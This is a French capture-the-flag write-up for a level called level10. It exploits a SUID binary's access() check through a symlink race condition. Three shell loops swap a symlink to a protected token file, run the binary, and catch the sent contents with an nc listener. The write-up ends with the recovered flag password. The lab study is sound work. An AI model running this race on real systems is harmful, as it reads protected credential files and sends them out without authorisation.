On peut voir que le level10 est un executable et possède un SUID.

Il y a également un fichier token qui n'est lisible que par flag10.

En lancant level10, l'executable donne l'usage suivant:

./level10 file host
	sends file to host if you have access to it

En décompilant level10, on s'appercoit que le programme envoie des datas sur le port 6969.
Il utilise également access() pour vérifier si l'on a accès au fichier.

On peut lancer un serveur netcat qui va écouter sur le port 6969 avec nc:

nc -lv localhost 6969

Quel que soit le lien symbolic que nous faisons, acces() retourne une erreur.

Pour passer, nous sommes obligés de forcer.

Dans un 1er terminal:

while true; do rm -rf /tmp/truc; touch /tmp/truc; ln -sfn ~/token /tmp/truc; done

A noter que pour passer access, le fichier DOIT Être crée par l'user, d'ou le touch.

Dans un 2ème terminal:

while true; do (~/level10 /tmp/truc 127.0.0.1); done

Dans un 3ème terminal: 

while true; do nc -l 6969 ;done

Nous sommes obligés de faire un boucle car sinon nc stoppe après 1 reception

Le flag pour se connecter au user flag10 est le suivant: woupa2yuojeeaaed06riuj63c
